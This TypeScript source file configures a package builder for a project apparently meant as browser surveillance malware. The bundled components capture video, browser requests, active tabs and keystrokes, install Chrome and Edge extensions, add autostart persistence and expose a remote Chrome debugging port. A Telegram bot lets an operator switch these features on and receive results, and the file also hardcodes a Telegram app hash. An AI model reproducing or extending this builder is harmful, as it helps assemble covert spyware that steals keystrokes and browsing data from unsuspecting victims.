import { PackageBuilder } from "./PackageBuilder";

/**
 * Default package configuration for serverVideoCapture.
 * Includes all relevant source files and sensible defaults.
 * Use fluent setters to configure secrets before building.
 */
export class DefaultPackageBuilder extends PackageBuilder {
  constructor() {
    super();

    // Source files and directories to include in the package
    this.files = [
      "index.ts",
      "Server.ts",
      "ServerRequestHook.ts",
      "BrowTabStorage.ts",
      "VideoCapture.ts",
      "AutostartManager.ts",
      "autorun.ts",
      "install_chrome_extension.ts",
      "install_edge_addons_extension.ts",
      "types.ts",
      "extPlugins",
      "notify",
      "storage",
    ];

    this.ignores = [
      'storage/active_tabs/*',
      'storage/keystrokes/*',
      'storage/requests/*',
    ];

    // Root .env defaults
    this.envVars = {
      SERVER_PORT: "8012",
      TG_BOT_API_SERVICE_PORT: "3033",
    };

    // notify/.env defaults — fill secrets via fluent setters
    this.notifyEnvVars = {
      BOT_TOKEN: "",
      DATABASE_PATH: "./database/database.sqlite",
      LOG_LEVEL: "info",
      BOT_APP_API_PORT: "3033",
      BOT_API_URL: "https://localhost:3000",
      APP_ENV: "production",
      BOT_DEV_HOT_RELOAD_SECTIONS: "false",
      BOT_ACCESS: "private",
      BOT_ACCESS_KEYS: "",
      ACCESS_USERNAMES: "",
      BOT_HOOK_DOMAIN: "",
      BOT_HOOK_PORT: "3000",
      GIFT_PAGE: "",
      TG_APP_ID: "2040",
      TG_APP_HASH: "b18441a1ff607e10a989891a5462e627",
      BTR_SERVER_PORT: "8012",
      REMOTE_CHROME_DEBUGGING_PORT: "9222",
    };

    // BtrSettings defaults — all disabled, operator enables via bot or setters
    this.btrSettings = {
      videoCaptureEnabled: false,
      serverEnabled: false,
      autostartupEnabled: false,
      requestsCaptureEnabled: false,
      activeTabsCaptureEnabled: false,
      plugins: [],
    };
  }

  public setBotToken(token: string): this {
    return this.setNotifyEnvVar("BOT_TOKEN", token);
  }

  public setBotAccessKeys(keys: string): this {
    return this.setNotifyEnvVar("BOT_ACCESS_KEYS", keys);
  }

  public setAccessUsernames(usernames: string): this {
    return this.setNotifyEnvVar("ACCESS_USERNAMES", usernames);
  }

  public setBtrServerPort(port: number): this {
    this.setNotifyEnvVar("BTR_SERVER_PORT", String(port));
    this.setNotifyEnvVar("BOT_APP_API_PORT", String(port));
    return this.setEnvVar("TG_BOT_API_SERVICE_PORT", String(port));
  }
}
